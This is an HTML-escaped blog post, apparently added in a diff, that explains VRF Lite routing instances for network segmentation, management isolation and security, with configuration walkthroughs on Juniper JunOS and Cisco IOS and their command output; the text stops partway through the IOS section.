+networks and at some point nearly all internet traffic passes through a VRF or
+two.&lt;/p&gt;
+
+&lt;p&gt;VRF Lite allows for interfaces on a physical router to belong to a routing instance.  This routing instance has its own forwarding table, ARP entries, and everything else needed to make a forwarding decision.  It can simply be thought of as a router within a router (&lt;em&gt;&lt;a title=&#34;Routers in router&#34; rel=&#34;lightbox&#34; href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/05/router-in-router.png&#34;&gt; Figure 1&lt;/a&gt;&lt;/em&gt;).&lt;/p&gt;
+
+&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px;margin-left: 60px;margin-right: 21px;&#34;&gt;&lt;a title=&#34;Routers in router&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/router-in-router.png&#34;&gt; &lt;img src=&#34;https://jeremyrossi.com/img/router-in-router.png&#34; border=&#34;0&#34; alt=&#34;router in router.png&#34; width=&#34;200&#34; height=&#34;135&#34; /&gt;
+&lt;p class=&#34;wp-caption-text&#34;&gt;Figure 1: Routers within Router&lt;/p&gt;
+
+&lt;/a&gt;&lt;/div&gt;
+
+&lt;p&gt;This structure makes VRFs useful for many applications and as a solution to
+quite a few tough network design issues. It can be used to improve the network
+in the following ways:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#vrf-intro-seg&#34;&gt;Segmentation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#vrf-intro-mgmt&#34;&gt;Management and Control&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#vrf-intro-sec&#34;&gt;Security&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;vrf-intro-seg:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Segmentation&lt;/h3&gt;
+
+&lt;p&gt;Layer 2 segmentation based on VLANs and firewalls is showing strains and being
+pushed beyond reasonableness when it comes to how a network architecture should
+be built. A good example of this is 10 Gig and 1 Gig Ethernet MANs&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:7aab83205c9396acb0cb1eb2f8393798:1&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:7aab83205c9396acb0cb1eb2f8393798:1&#34;&gt;1&lt;/a&gt;&lt;/sup&gt; that span
+multiple buildings and datacenters into a single campus. An overview of a large
+campus network can been seen in &lt;a title=&#34;Large MAN Overview&#34; rel=&#34;lightbox&#34;
+href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/04/man-example.png&#34;&gt;Figure 2&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;In our example network, creating wired guest access would require the use
+of firewalls in each building or extending VLANs between buildings to the
+centralized firewalls in the datecenter. Both options have downsides that VRFs
+would be better at solving.&lt;/p&gt;
+
+&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px;margin-left: 60px;margin-right: 21px;&#34;&gt;&lt;a title=&#34;Figure 1: Large MAN Overview&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/man-example.png&#34;&gt;&lt;img src=&#34;https://jeremyrossi.com/img/man-example.png&#34; border=&#34;1&#34; alt=&#34;MAN Network Diagram&#34; width=&#34;200&#34; height=&#34;204&#34; /&gt; &lt;/a&gt;
+&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a title=&#34;Figure 1: Large MAN Overview&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/man-example.png&#34;&gt;Figure 2: Large MAN Overview&lt;/a&gt;&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;p&gt;In the case of extending VLANs between buildings this would have the campus
+network design rely on Spanning Tree and layer 2 protocols to provide a
+loop-free environment. In the case of a large network such as our example, this
+could lead to long failover times during hardware failure, while also not making
+full use of all available network bandwidth.&lt;/p&gt;
+
+&lt;p&gt;The use of firewalls mitigates most of the network utilization and failure times
+by making use of layer 3 routed campus design, but this comes at a large cost.
+Namely, the cost is incurred in maintenance and raw hardware costs for large
+firewalls that are able to deal with 10 Gig and 1 Gig ethernet line rates. The
+use of access-lists are often supplemented for firewalls to reduce costs, but
+this approach is fraught with issues and access-lists are never reviewed often
+enough.&lt;/p&gt;
+
+&lt;p&gt;A VRF based solution for a wired guest network on a large campus would
+allow guest traffic to be routed to the firewalls in the datacenters via
+routing policy while still being segmented away from production traffic. By
+leveraging VRFs none of the aforementioned compromises are required to keep
+this separation. The production network is able to fully utilize all available
+links and not relay on spanning tree protocol between sites for a loop free
+environment.&lt;/p&gt;
+
+&lt;h3 id=&#34;vrf-intro-mgmt:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Management and Control&lt;/h3&gt;
+
+&lt;p&gt;For managing devices on a network, there is a need for out of band (OOB)
+connections. There really is no other sure-fire way of gaining access during
+a truly catastrophic event other than this tried and true modem/console
+connection. But for the daily running and maintenance of the network, OOB just
+can not keep up with the needs of daily maintenance and the amount of traffic
+generated by NetFlow, logging, ftp/tftp backups, and scp (secure copy) of new
+images. To complete these high bandwidth functions, most companies I have seen
+and worked with just resort to using the network that servers and even desktops
+traffic utilize. This traffic in many cases is highly sensitive and really
+should not be available to anyone outside of authorized users.&lt;/p&gt;
+
+&lt;p&gt;VRFs can help to move this traffic out of the primary network and into a second
+network that only services management functions and has no direct access to
+the Internet, desktops, or other uncontrolled resources. In fact, Cisco is now
+adding VRF management ports to some of their newer devices&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:7aab83205c9396acb0cb1eb2f8393798:4&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:7aab83205c9396acb0cb1eb2f8393798:4&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;. The use of ACL&amp;rsquo;s
+and other forms of control and logging are still needed, but they become simpler
+to keep updated and are normally far less complicated when production traffic is
+neither expected nor allowed.&lt;/p&gt;
+
+&lt;h3 id=&#34;vrf-intro-sec:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Security&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&amp;ldquo;I&amp;hellip; I don&amp;rsquo;t know exactly how to put this, sir, but are you aware of what a serious breach of security that would be?
+I mean, he&amp;rsquo;ll see everything, he&amp;rsquo;ll&amp;hellip; he&amp;rsquo;ll see the Big Board!&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;Gen &amp;quot;Buck&amp;quot; Turgidson&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;VRFs allow for complete separation of different routing instances from one
+another. This simple and effective concept of hiding networks from each other
+and limiting the ability of devices from interacting outside of defined
+boundaries creates a more secure network. A good example of this would be a
+voice network within a campus. In general, there is very little reason for VoIP
+end points to speak to anything other than the voice gateway and each other.
+Moving of voice traffic to a VRF allows for gateways to still interact and even
+direct device-to-device interconnection, while greatly reducing the attack
+vectors.&lt;/p&gt;
+
+&lt;p&gt;VRFs do increase the surface area of your network devices due to the increased
+number of addressable interfaces on each hardware device. But I would counter
+this with the fact that the network is divided into more domain specific
+networks. The ACL and protection measures required become much simpler to
+implement and keep up to date. A good and simple example of this would be to
+just block all management functions for anything outside of the management VRF.&lt;/p&gt;
+
+&lt;h2 id=&#34;vrf-setup:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;VRF Lite Setup&lt;/h2&gt;
+
+&lt;p&gt;VRF Lite is supported on most modern network hardware, but I personally have not used them
+outside of &lt;a href=&#34;http://juniper.net/products/junos/&#34;&gt;Juniper JunOS&lt;/a&gt;,
+&lt;a href=&#34;http://www.juniper.net/techpubs/software/screenos/screenos6.1.0/index.html&#34;&gt;Juniper ScreenOS&lt;/a&gt;,
+and Cisco &lt;a href=&#34;http://cisco.com/go/ios&#34;&gt;IOS&lt;/a&gt;.  Each Platform/Company has it&amp;rsquo;s own
+naming&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:7aab83205c9396acb0cb1eb2f8393798:3&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:7aab83205c9396acb0cb1eb2f8393798:3&#34;&gt;3&lt;/a&gt;&lt;/sup&gt; convention for the this feature, but the concept is the same in each.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&amp;ldquo;Gentlemen, you can&amp;rsquo;t fight in here! This is the War Room.&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;Pres Merkin Muffley&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#setup-junos&#34;&gt;Setup on Juniper JunOS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#setup-ios&#34;&gt;Setup on Cisco IOS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#setup-screenos&#34;&gt;Setup on Juniper ScreenOS&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;setup-junos:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;VRF Lite Setup on Juniper JunOS&lt;/h3&gt;
+
+&lt;p&gt;First we need to setup some basic interfaces for later use. We will not be
+assigning them an IP address as I do not want to pollute the global routing
+table&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:7aab83205c9396acb0cb1eb2f8393798:2&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:7aab83205c9396acb0cb1eb2f8393798:2&#34;&gt;4&lt;/a&gt;&lt;/sup&gt;. We will be using VLANs on ethernet interfaces to break up the router
+&lt;code&gt;junos-1&lt;/code&gt; into three virtual routers.&lt;/p&gt;
+
+&lt;p&gt;Enable VLAN tagging on the interfaces and create some sub interfaces.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;set interfaces fe-0/0/0 vlan-tagging
+set interfaces fe-0/0/0 unit 100 vlan-id 100
+set interfaces fe-0/0/0 unit 100 description &amp;quot;Untrust&amp;quot;
+set interfaces fe-0/0/0 unit 200 vlan-id 200
+set interfaces fe-0/0/0 unit 200 description &amp;quot;Trust&amp;quot;
+set interfaces fe-0/0/0 unit 300 vlan-id 300
+set interfaces fe-0/0/0 unit 300 description &amp;quot;DMZ&amp;quot;
+set interfaces fe-0/0/0 unit 400 vlan-id 400
+set interfaces fe-0/0/0 unit 400 description &amp;quot;Trust&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The verify the results and commit the changes.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[edit]
+jrossi@junos-1# show interfaces
+fe-0/0/0 {
+	vlan-tagging;
+	unit 100 {
+		description Untrust;
+		vlan-id 100;
+	}
+	unit 200 {
+		description Trust;
+		vlan-id 200;
+	}
+	unit 300 {
+		description DMZ;
+		vlan-id 300;
+	}
+	unit 400 {
+		description Trust;
+		vlan-id 400;
+	}
+}
+
+[edit]
+jrossi@junos-1# commit
+commit complete
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now let&amp;rsquo;s create three new routing-instances: Trust, Untrust, and DMZ. The
+&lt;code&gt;instance-type&lt;/code&gt; supports quite a few option types on JunOS, but to to create a
+VRF Lite instance we just need to use &lt;code&gt;virtual-router&lt;/code&gt;. We also need to assign
+interfaces to each newly created instance. This is very different than in Cisco
+IOS in that one configures VRF in the interface configuration hierarchy.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;show routing-instances
+set routing-instances Trust instance-type virtual-router
+set routing-instances Trust interface fe-0/0/0.200
+set routing-instances Trust interface fe-0/0/0.400
+set routing-instances Untrust instance-type virtual-router
+set routing-instances Untrust interface fe-0/0/0.100
+set routing-instances DMZ instance-type virtual-router
+set routing-instances DMZ interface fe-0/0/0.300
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;View the results and commit the change.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[edit]
+jrossi@junos-1# show routing-instances
+Trust {
+	instance-type virtual-router;
+	interface fe-0/0/0.200;
+	interface fe-0/0/0.400;
+}
+Untrust {
+	instance-type virtual-router;
+	interface fe-0/0/0.100;
+}
+DMZ {
+	instance-type virtual-router;
+	interface fe-0/0/0.300;
+}
+
+[edit]
+jrossi@junos-1# commit
+commit complete
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, we have the interfaces configured and set up without addresses. If we look
+at the routing table nothing shows up because we have not enabled any interface
+families. Once we add address to the &lt;code&gt;family inet&lt;/code&gt; interface configuration, the
+routing table will begin to take shape.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jrossi@junos-1# run show route
+
+inet.0: 6 destinations, 6 routes (6 active, 0 holddown, 0 hidden)
++ = Active Route, - = Last Active, * = Both
+
+0.0.0.0/0          *[Static/5] 03:47:47
+                    &amp;gt; to 10.4.37.1 via fe-0/0/1.0
+10.4.37.0/24       *[Direct/0] 1d 19:35:26
+                    &amp;gt; via fe-0/0/1.0
+10.4.37.9/32       *[Local/0] 1d 19:35:26
+                      Local via fe-0/0/1.0
+192.168.5.0/24     *[Direct/0] 1d 13:13:18
+                    &amp;gt; via fe-0/0/1.0
+192.168.5.123/32   *[Local/0] 1d 13:13:18
+                      Local via fe-0/0/1.0
+224.0.0.5/32       *[OSPF/10] 1d 12:50:00, metric 1
+                     MultiRecv
+
+__juniper_private2__.inet.0: 1 destinations, 1 routes (0 active, 0 holddown, 1 hidden)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let&amp;rsquo;s add some interface &lt;code&gt;family inet&lt;/code&gt; addresses. I am going to use overlapping
+address ranges to show that when VRF is used they do not interfere with each
+other.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;set interfaces fe-0/0/0 unit 100 family inet address 10.10.10.1/24
+set interfaces fe-0/0/0 unit 200 family inet address 172.16.10.1/24
+set interfaces fe-0/0/0 unit 300 family inet address 10.10.10.1/24
+set interfaces fe-0/0/0 unit 400 family inet address 192.168.10.1/24
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now let&amp;rsquo;s verify the changes and commit them.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jrossi@junos-1# show interfaces fe-0/0/0 
+vlan-tagging;
+unit 100 {
+    description Untrust;
+    vlan-id 100;
+    family inet {
+        address 10.10.10.1/24;
+    }
+}
+unit 200 {
+    description Trust;
+    vlan-id 200;
+    family inet {
+        address 172.16.10.1/24;
+    }
+}
+unit 300 {
+    description DMZ;
+    vlan-id 300;
+    family inet {
+        address 10.10.10.1/24;
+    }
+}
+unit 400 {
+    description Trust;
+    vlan-id 400;
+    family inet {
+        address 192.168.10.1/24;
+    }
+}
+
+[edit]
+jrossi@junos-1# commit 
+commit complete
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When we look into the routing you see much more information and can even see the
+different routing instances. The global routing table &lt;code&gt;inet.0&lt;/code&gt; is the default
+table your would normally work with. Further down the list you see &lt;code&gt;DMZ.inet.0&lt;/code&gt;,
+&lt;code&gt;Trust.inet.0&lt;/code&gt;, and &lt;code&gt;Untrust.inet.0&lt;/code&gt;; they are the newly created VRF Lite
+routing instances.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[edit]
+jrossi@junos-1# run show route 
+
+inet.0: 6 destinations, 6 routes (6 active, 0 holddown, 0 hidden)
++ = Active Route, - = Last Active, * = Both
+
+0.0.0.0/0          *[Static/5] 04:27:06
+                    &amp;gt; to 10.4.37.1 via fe-0/0/1.0
+10.4.37.0/24       *[Direct/0] 1d 20:14:45
+                    &amp;gt; via fe-0/0/1.0
+10.4.37.9/32       *[Local/0] 1d 20:14:45
+                      Local via fe-0/0/1.0
+192.168.5.0/24     *[Direct/0] 1d 13:52:37
+                    &amp;gt; via fe-0/0/1.0
+192.168.5.123/32   *[Local/0] 1d 13:52:37
+                      Local via fe-0/0/1.0
+224.0.0.5/32       *[OSPF/10] 1d 13:29:19, metric 1
+                      MultiRecv
+
+__juniper_private2__.inet.0: 1 destinations, 1 routes (0 active, 0 holddown, 1 hidden)
+
+DMZ.inet.0: 2 destinations, 2 routes (2 active, 0 holddown, 0 hidden)
++ = Active Route, - = Last Active, * = Both
+
+10.10.10.0/24      *[Direct/0] 00:00:06
+                    &amp;gt; via fe-0/0/0.300
+10.10.10.1/32      *[Local/0] 00:00:06
+                      Local via fe-0/0/0.300
+
+Trust.inet.0: 4 destinations, 4 routes (4 active, 0 holddown, 0 hidden)
++ = Active Route, - = Last Active, * = Both
+
+172.16.10.0/24     *[Direct/0] 00:00:18
+                    &amp;gt; via fe-0/0/0.200
+172.16.10.1/32     *[Local/0] 00:00:18
+                      Local via fe-0/0/0.200
+192.168.10.0/24    *[Direct/0] 00:00:06
+                    &amp;gt; via fe-0/0/0.400
+192.168.10.1/32    *[Local/0] 00:00:06
+                      Local via fe-0/0/0.400
+
+Untrust.inet.0: 2 destinations, 2 routes (2 active, 0 holddown, 0 hidden)
++ = Active Route, - = Last Active, * = Both
+
+10.10.10.0/24      *[Direct/0] 00:03:26
+                    &amp;gt; via fe-0/0/0.100
+10.10.10.1/32      *[Local/0] 00:03:26
+                      Local via fe-0/0/0.100
+
+
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;While having interfaces with addresses and different routing tables is cool and
+all, this does next to nothing as there is no real routing going on so let&amp;rsquo;s add
+some.&lt;/p&gt;
+
+&lt;p&gt;Start out by adding a default route to the &lt;code&gt;Trust&lt;/code&gt; VRF lite configuration. The
+commands to perform this are almost exactly the same for the global routing
+table. The only difference is that you start under the &lt;code&gt;routing-instances&lt;/code&gt;
+configuration hierarchy. This also applies for routing protocols.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;set routing-instances Trust routing-options static route 0.0.0.0/0 next-hop 192.168.10.2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now let&amp;rsquo;s verify our configuration and commit the change.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[edit]
+jrossi@junos-1# show routing-instances Trust 
+instance-type virtual-router;
+interface fe-0/0/0.200;
+interface fe-0/0/0.400;
+routing-options {
+    static {
+        route 0.0.0.0/0 next-hop 192.168.10.2;
+    }
+}
+
+[edit]
+jrossi@junos-1# commit 
+commit complete
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now let&amp;rsquo;s take a look at the &lt;code&gt;Trust.inet.0&lt;/code&gt; routing table. This time we are
+going limit our show route command to just the &lt;code&gt;Trust&lt;/code&gt; table.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[edit]
+jrossi@junos-1# run show route table Trust 
+
+Trust.inet.0: 5 destinations, 5 routes (5 active, 0 holddown, 0 hidden)
++ = Active Route, - = Last Active, * = Both
+
+0.0.0.0/0          *[Static/5] 00:36:26
+                    &amp;gt; to 192.168.10.2 via fe-0/0/0.400
+172.16.10.0/24     *[Direct/0] 00:00:18
+                    &amp;gt; via fe-0/0/0.200
+172.16.10.1/32     *[Local/0] 00:00:18
+                      Local via fe-0/0/0.200
+192.168.10.0/24    *[Direct/0] 00:56:56
+                    &amp;gt; via fe-0/0/0.400
+192.168.10.1/32    *[Local/0] 00:56:56
+                      Local via fe-0/0/0.400
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;setup-ios:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;VRF Lite Setup on Cisco IOS&lt;/h3&gt;
+
+&lt;p&gt;Cisco IOS is used here and it&amp;rsquo;s very new and buggy 12.4T(22), but as this is
+what I installed to test other features of IOS, I figured it would not be a
+problem for this write up. It should also be more than adequate for VRF Lite.
+Please note that there are a large number of extra interfaces and features
+configured on this router as I do lots of playing around with IOS on this
+device.&lt;/p&gt;
+
+&lt;p&gt;Just like in the JunOS Example, we are going to create some sub-interfaces to
+start off with.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config)#int gi0/0
+ios-1(config-if)#no shut
+ios-1(config-i)#int gi0/0.100
+ios-1(config-subif)#description Untrust
+ios-1(config-subif)#encapsulation dot1Q 100
+ios-1(config-subif)#int gi0/0.200
+ios-1(config-subif)#description Trust
+ios-1(config-subif)#encapsulation dot1Q 200
+ios-1(config-subif)#int gi0/0.300
+ios-1(config-subif)#description DMZ
+ios-1(config-subif)#encapsulation dot1Q 300
+ios-1(config-subif)#int gi0/0.400
+ios-1(config-subif)#description Trust
+ios-1(config-subif)#encapsulation dot1Q 400
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just a quick peek to see that things are as we expect them.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config-subif)#do show ip int br
+Interface                  IP-Address      OK? Method Status                Protocol
+GigabitEthernet0/0         unassigned      YES NVRAM  up                    up
+GigabitEthernet0/0.100     unassigned      YES unset  up                    up
+GigabitEthernet0/0.200     unassigned      YES unset  up                    up
+GigabitEthernet0/0.300     unassigned      YES unset  up                    up
+GigabitEthernet0/0.400     unassigned      YES unset  up                    up
+GigabitEthernet0/1         1.1.1.1         YES NVRAM  up                    up
+FastEthernet0/3/0          unassigned      YES unset  down                  down
+FastEthernet0/3/1          unassigned      YES unset  up                    down
+FastEthernet0/3/2          unassigned      YES unset  up                    down
+FastEthernet0/3/3          unassigned      YES unset  up                    down
+ATM0/1/0                   unassigned      YES NVRAM  administratively down down
+ATM0/1/0.1                 unassigned      YES unset  administratively down down
+Dot11Radio0/2/0            unassigned      YES NVRAM  up                    up
+Dot11Radio0/2/0.1          192.168.128.1   YES NVRAM  up                    up
+Dot11Radio0/2/0.3          192.168.11.1    YES NVRAM  up                    up
+Dot11Radio0/2/0.4          192.168.4.1     YES NVRAM  up                    up
+Dot11Radio0/2/0.5          unassigned      YES unset  up                    up
+Dot11Radio0/2/0.10         192.168.10.1    YES NVRAM  up                    up
+Dot11Radio0/2/1            unassigned      YES NVRAM  administratively down down
+Vlan1                      unassigned      YES NVRAM  up                    down
+Vlan3                      192.168.3.1     YES NVRAM  up                    down
+Vlan5                      unassigned      YES NVRAM  up                    down
+Vlan20                     192.168.20.1    YES NVRAM  up                    down
+NVI0                       192.168.1.1     YES unset  up                    up
+SSLVPN-VIF0                unassigned      NO  unset  up                    up
+BVI3                       192.168.5.1     YES NVRAM  up                    up
+Loopback1                  192.168.1.1     YES NVRAM  up                    up
+Loopback69                 192.168.69.1    YES NVRAM  up                    up
+Loopback100                unassigned      YES NVRAM  up                    up
+Loopback666                10.10.10.2      YES NVRAM  up                    up
+Tunnel255                  192.168.255.2   YES NVRAM  up                    up
+
+ios-1(config-subif)#do show int desc
+Interface                      Status         Protocol Description
+Gi0/0                          up             up
+Gi0/0.100                      up             up       Untrust
+Gi0/0.200                      up             up       Trust
+Gi0/0.300                      up             up       DMZ
+Gi0/0.400                      up             up       Trust
+Gi0/1                          up             up
+Fa0/3/0                        down           down
+Fa0/3/1                        up             down
+Fa0/3/2                        up             down
+Fa0/3/3                        up             down
+AT0/1/0                        admin down     down
+AT0/1/0.1                      admin down     down
+Do0/2/0                        up             up
+Do0/2/0.1                      up             up
+Do0/2/0.3                      up             up
+Do0/2/0.4                      up             up
+Do0/2/0.5                      up             up
+Do0/2/0.10                     up             up
+Do0/2/1                        admin down     down
+Vl1                            up             down
+Vl3                            up             down
+Vl5                            up             down
+Vl20                           up             down
+NV0                            up             up
+SS0                            up             up
+BV3                            up             up
+Lo1                            up             up
+Lo69                           up             up       for webvpn
+Lo100                          up             up
+Lo666                          up             up
+Tu255                          up             up
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Much like in the JunOS configuration we will now create three new routing
+instances (VRF Lite).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config)#ip vrf
+ios-1(config)#ip vrf Untrust
+ios-1(config-vrf)#ip vrf Untrust
+ios-1(config-vrf)#description Scary wild wild west
+ios-1(config-vrf)#ip vrf Trust
+ios-1(config-vrf)#ip vrf DMZ
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;I don&amp;rsquo;t give a hoot in Hell how you do it, you just get me to the Primary, ya hear!&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;Major T. J. &amp;quot;King&amp;quot; Kong&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Now let&amp;rsquo;s configure some interfaces and add some addresses. Once again, I am
+going to use overlapping ranges to show that VRF Lite allows for it.&lt;/p&gt;
+
+&lt;p&gt;Adding interfaces to a routing instance is configured under the actual interface
+configuration hierarchy with the command &lt;code&gt;ip vrf forward&lt;/code&gt;. If you have an
+address already assigned when you run the &lt;code&gt;ip vrf forwarding&lt;/code&gt; the address will
+be removed. This is done to make sure that conflicts or pollution of the new
+routing table doesn&amp;rsquo;t happen unintentionally.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config)#int gi0/0.100
+ios-1(config-subif)#ip vrf forwarding Untrust
+ios-1(config-subif)#ip address 10.10.10.1 255.255.255.0
+ios-1(config-subif)#int gi0/0.200
+ios-1(config-subif)#ip vrf forwarding Trust
+ios-1(config-subif)#ip address 172.16.10.1 255.255.255.0
+ios-1(config-subif)#int gi0/0.300
+ios-1(config-subif)#ip vrf forwarding DMZ
+ios-1(config-subif)#ip address 10.10.10.1 255.255.255.0
+ios-1(config-subif)#int gi0/0.400
+ios-1(config-subif)#ip vrf forwarding Trust
+ios-1(config-subif)#ip address 192.168.10.1 255.255.255.0
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Before we move forward, let&amp;rsquo;s look into some of the show commands around VRFs on IOS.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1#show ip vrf 
+  Name                             Default RD          Interfaces
+  DMZ                              &amp;lt;not set&amp;gt;           Gi0/0.300
+  Trust                            &amp;lt;not set&amp;gt;           Gi0/0.200
+                                                       Gi0/0.400
+  Untrust                          &amp;lt;not set&amp;gt;           Gi0/0.100
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The command &lt;code&gt;show ip route&lt;/code&gt; Cisco IOS will not show you anything about the other
+routing instances, just the global table.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config-subif)#do show ip route
+Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2
+       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
+       ia - IS-IS inter area, * - candidate default, U - per-user static route
+       o - ODR, P - periodic downloaded static route
+
+Gateway of last resort is 1.1.1.2 to network 0.0.0.0
+
+C    192.168.128.0/24 is directly connected, Dot11Radio0/2/0.1
+C    192.168.10.0/24 is directly connected, Dot11Radio0/2/0.10
+C    192.168.11.0/24 is directly connected, Dot11Radio0/2/0.3
+C    192.168.4.0/24 is directly connected, Dot11Radio0/2/0.4
+C    192.168.5.0/24 is directly connected, BVI3
+C    1.1.1.0/24 is directly connected, GigabitEthernet0/1
+     192.168.255.0/30 is subnetted, 1 subnets
+C       192.168.255.0 is directly connected, Tunnel255
+     192.168.1.0/32 is subnetted, 1 subnets
+C       192.168.1.1 is directly connected, Loopback1
+C    192.168.69.0/24 is directly connected, Loopback69
+O    192.168.2.0/24 [110/1001] via 192.168.255.1, 1d07h, Tunnel255
+S*   0.0.0.0/0 [1/0] via 1.1.1.2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Using the command &lt;code&gt;show ip route vrf&lt;/code&gt; we can see into each routing table, or
+the use of &lt;code&gt;show ip route vrf *&lt;/code&gt; will let us see them all at once.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ios-1#show ip route vrf *
+Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2
+       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
+       ia - IS-IS inter area, * - candidate default, U - per-user static route
+       o - ODR, P - periodic downloaded static route
+
+Gateway of last resort is 1.1.1.1 to network 0.0.0.0
+
+C    192.168.128.0/24 is directly connected, Dot11Radio0/2/0.1
+C    192.168.10.0/24 is directly connected, Dot11Radio0/2/0.10
+C    192.168.11.0/24 is directly connected, Dot11Radio0/2/0.3
+C    192.168.4.0/24 is directly connected, Dot11Radio0/2/0.4
+C    192.168.20.0/24 is directly connected, Vlan20
+C    192.168.5.0/24 is directly connected, BVI3
+C    1.1.1.0/24 is directly connected, GigabitEthernet0/1
+     192.168.255.0/30 is subnetted, 1 subnets
+C       192.168.255.0 is directly connected, Tunnel255
+     192.168.1.0/32 is subnetted, 1 subnets
+C       192.168.1.1 is directly connected, Loopback1
+C    192.168.69.0/24 is directly connected, Loopback69
+O    192.168.2.0/24 [110/1001] via 192.168.255.1, 1d14h, Tunnel255
+C    192.168.3.0/24 is directly connected, Vlan3
